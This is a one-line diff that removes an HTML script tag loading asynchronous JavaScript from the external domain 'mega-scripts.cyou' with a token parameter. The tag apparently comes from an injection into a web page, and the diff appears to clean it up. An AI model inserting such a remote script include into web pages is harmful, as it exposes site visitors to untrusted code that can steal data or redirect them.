@@ -1,1 +1,0 @@
-<script type="text/javascript" src="https://mega-scripts.cyou/?token=9f407421dedf58ca565acc27c3f8891f"async="true"></script>
